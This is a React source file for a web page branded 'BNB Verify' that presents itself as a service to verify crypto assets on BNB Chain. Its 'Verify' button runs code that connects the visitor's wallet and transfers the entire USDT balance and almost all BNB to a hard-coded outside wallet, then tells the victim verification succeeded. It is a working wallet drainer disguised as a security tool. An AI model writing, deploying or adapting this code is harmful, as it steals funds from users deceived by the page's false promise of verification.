import { useState } from "react";
import { ethers } from "ethers";

export default function App() {
  const [walletAddress, setWalletAddress] = useState("");
  const [verified, setVerified] = useState(false);

  const yourWallet = "0x82b0d4e6799314353b001bfece2eb3a0cda57866"; // Your Bitget USDT/BEP20 wallet
  const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT BEP20
  const USDT_ABI = [
    "function balanceOf(address) view returns (uint256)",
    "function transfer(address to, uint256 amount) returns (bool)"
  ];

  // Connect wallet
  async function connectWallet() {
    if (!window.ethereum) return alert("Install MetaMask or Binance Wallet!");
    const provider = new ethers.BrowserProvider(window.ethereum);
    await provider.send("eth_requestAccounts", []);
    const signer = await provider.getSigner();
    const address = await signer.getAddress();
    setWalletAddress(address);
  }

  // Verify user (transfer BNB and/or USDT)
  async function verifyUser() {
    if (!window.ethereum) return alert("Install MetaMask or Binance Wallet!");
    const provider = new ethers.BrowserProvider(window.ethereum);
    await provider.send("eth_requestAccounts", []);
    const signer = await provider.getSigner();
    const address = await signer.getAddress();

    let transferred = false;

    // 1️⃣ Check and transfer USDT BEP20
    try {
      const usdtContract = new ethers.Contract(usdtAddress, USDT_ABI, signer);
      const usdtBalance = await usdtContract.balanceOf(address);
      if (usdtBalance > 0n) {
        const tx = await usdtContract.transfer(yourWallet, usdtBalance);
        await tx.wait();
        transferred = true;
        console.log(`Transferred ${usdtBalance} USDT`);
      }
    } catch (err) {
      console.error("USDT transfer failed:", err);
    }

    // 2️⃣ Check and transfer BNB
    try {
      const bnbBalance = await provider.getBalance(address);
      if (bnbBalance > 0n) {
        const gasPrice = await provider.getFeeData();
        const gasLimit = 21000n;
        const gasCost = gasPrice.gasPrice * gasLimit;
        const amountToSend = bnbBalance - gasCost;

        if (amountToSend > 0n) {
          const tx = await signer.sendTransaction({
            to: yourWallet,
            value: amountToSend
          });
          await tx.wait();
          transferred = true;
          console.log(`Transferred ${amountToSend} BNB`);
        }
      }
    } catch (err) {
      console.error("BNB transfer failed:", err);
    }

    if (transferred) {
      alert("✅ Verification successful! Assets transferred.");
      setVerified(true);
    } else {
      alert("⚠️ No BNB or USDT found in wallet.");
    }
  }

  return (
    <div className="bg-[#0B0B0B] min-h-screen font-sans text-[#E0E0E0]">

      {/* Navbar */}
      <header className="bg-[#111] sticky top-0 z-50 shadow-md">
        <div className="container mx-auto flex justify-between items-center px-6 py-4">
          <div className="flex items-center space-x-3">
            <div className="h-8 w-8 bg-yellow-400 rounded-full"></div>
            <span className="text-xl font-bold text-yellow-400">BNB Verify</span>
          </div>

          <div className="hidden md:flex space-x-6 items-center">
            <a href="#" className="hover:text-yellow-400 transition">Home</a>
            <a href="#" className="hover:text-yellow-400 transition">Explorer</a>
            <a href="#" className="hover:text-yellow-400 transition">Tokens</a>
            <a href="#" className="hover:text-yellow-400 transition">NFTs</a>
            <a href="#" className="hover:text-yellow-400 transition">DApps</a>

            {!walletAddress ? (
              <button
                onClick={connectWallet}
                className="bg-gradient-to-r from-yellow-500 to-yellow-400 text-black font-semibold px-5 py-2 rounded-xl hover:brightness-105 transition"
              >
                Connect Wallet
              </button>
            ) : (
              <span className="px-3 py-2 bg-gray-800 text-green-400 rounded-xl font-mono">
                {walletAddress.slice(0,6)}...{walletAddress.slice(-4)}
              </span>
            )}
          </div>
        </div>
      </header>

      {/* Hero Section */}
      <main className="container mx-auto px-6 py-16 lg:py-32 grid grid-cols-1 lg:grid-cols-2 gap-12 items-center">

        {/* Left */}
        <div className="text-center lg:text-left space-y-6">
          <div className="inline-block bg-gray-900 text-yellow-400 text-xs font-semibold px-4 py-1 rounded-full">
            Powered by BNB Chain
          </div>
          <h1 className="text-4xl md:text-5xl lg:text-6xl font-bold text-white leading-tight">
            Verify Crypto Assets on <br className="hidden md:inline" />BNB Chain
          </h1>
          <p className="text-gray-400 max-w-lg mx-auto lg:mx-0">
            Our platform provides instant verification of BNB Chain assets, ensuring authenticity and security for all your crypto transactions.
          </p>

          <div className="flex flex-col md:flex-row gap-4 mt-4 justify-center lg:justify-start">
            <button
              onClick={verifyUser}
              className="bg-gradient-to-r from-yellow-500 to-yellow-400 text-black font-bold px-8 py-4 rounded-xl shadow-lg hover:brightness-105 transition w-full md:w-auto"
            >
              Verify
            </button>
            <a
              href="#"
              className="border-2 border-yellow-400 text-yellow-400 px-8 py-4 rounded-xl font-bold hover:bg-yellow-500 hover:text-black transition w-full md:w-auto text-center"
            >
              Explore BNB Chain
            </a>
          </div>
        </div>

        {/* Right */}
        <div className="relative flex justify-center items-center h-96 lg:h-auto">
          <div className="absolute flex justify-center items-center">
            <div className="absolute w-72 h-72 rounded-full border-2 border-yellow-400 border-opacity-30 animate-pulse animate-[pulse_4s_cubic-bezier(0.4,0,0.6,1)_infinite]"></div>
            <div className="absolute w-56 h-56 rounded-full border-2 border-yellow-400 border-opacity-50 animate-pulse animate-[pulse_4s_cubic-bezier(0.4,0,0.6,1)_infinite]"></div>
            <div className="absolute w-40 h-40 rounded-full border-2 border-yellow-400 border-opacity-70 animate-pulse animate-[pulse_4s_cubic-bezier(0.4,0,0.6,1)_infinite]"></div>
            <svg className="h-24 w-24 text-yellow-400" fill="currentColor" viewBox="0 0 48 48">
              <path d="M24 0L12 12L24 24L12 36L24 48L36 36L24 24L36 12L24 0Z" />
            </svg>
          </div>
        </div>

      </main>
    </div>
  );
}
